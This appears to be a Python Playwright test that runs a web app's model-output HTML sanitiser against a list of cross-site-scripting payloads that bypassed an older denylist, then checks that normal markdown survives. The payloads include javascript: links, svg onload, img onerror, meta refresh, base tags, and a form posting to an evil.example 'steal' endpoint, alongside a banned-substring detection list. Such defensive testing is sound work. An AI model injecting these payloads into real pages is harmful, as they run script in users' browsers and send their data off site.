"""Standalone check of the model-output sanitiser (audit finding 4). No server needed.

Loads the vendored marked and DOMPurify into a blank Chromium page, runs the sanitiser block from
static/src/07-brief.js (between the sanitize:begin and sanitize:end markers) and feeds it the payloads
that got past the old denylist. Run:  python3 tests/ui/sanitize_check.py
"""
from __future__ import annotations

import pathlib
import sys

from playwright.sync_api import sync_playwright

ROOT = pathlib.Path(__file__).resolve().parents[2]
SRC = (ROOT / "static/src/07-brief.js").read_text()
BLOCK = SRC.split("// sanitize:begin", 1)[1].split("// sanitize:end", 1)[0].split("\n", 1)[1]

PAYLOADS = {
    "javascript: link with a leading space": '<a href=" javascript:alert(1)">x</a>',
    "javascript: link with a leading tab": '<a href="\tjavascript:alert(1)">x</a>',
    "entity-encoded javascript: link": '<a href="&#106;avascript:alert(1)">x</a>',
    "svg with an onload": '<svg onload="alert(1)"><circle r="5"/></svg>',
    "svg use with an external href": '<svg><use href="https://evil.example/x.svg#a"/></svg>',
    "form posting off site": '<form action="https://evil.example/steal"><input name="p"><button>Go</button></form>',
    "button with formaction": '<button formaction="https://evil.example">Go</button>',
    "base tag after text": 'hello <base href="https://evil.example/">',
    "img with onerror": '<img src="x" onerror="alert(1)">',
    "iframe": '<iframe src="https://evil.example"></iframe>',
    "style tag": '<style>body{display:none}</style>',
    "meta refresh": '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    "protocol-relative link": '<a href="//evil.example/x">x</a>',
    "data: link": '<a href="data:text/html,<script>alert(1)</script>">x</a>',
}
BANNED = ("javascript:", "<svg", "<form", "<button", "<base", "onerror", "onload", "<iframe", "<style", "<meta",
          "//evil.example", "data:text/html", "<img", "<input", "<use")


def main() -> int:
    bad = 0
    with sync_playwright() as pw:
        b = pw.chromium.launch()
        page = b.new_page()
        page.set_content("<!doctype html><html><body></body></html>")
        page.add_script_tag(path=str(ROOT / "static/vendor/marked.umd.js"))
        page.add_script_tag(path=str(ROOT / "static/vendor/purify.min.js"))
        page.add_script_tag(content="window.esc = (s) => String(s).replace(/[&<>\"']/g, (c) => '&#' + c.charCodeAt(0) + ';');\n"
                                    + BLOCK + "\nwindow.cyemSanitize = sanitize;")
        for name, html in PAYLOADS.items():
            out = page.evaluate("(h) => window.cyemSanitize(h)", html)
            hit = [w for w in BANNED if w in out.lower()]
            print(f"{'FAIL' if hit else 'ok  '}  {name}: {out!r}")
            bad += bool(hit)
        md = page.evaluate("(m) => window.cyemSanitize(marked.parse(m))",
                           "**Bold** [ref](https://example.org) and a table\n\n| a | b |\n|---|---|\n| 1 | 2 |")
        keep = all(w in md for w in ("<strong>Bold</strong>", 'href="https://example.org"', 'rel="noopener noreferrer"', "<table>"))
        print(f"{'ok  ' if keep else 'FAIL'}  ordinary markdown survives: {md!r}")
        bad += not keep
        b.close()
    print("PASS" if not bad else f"{bad} FAILED")
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
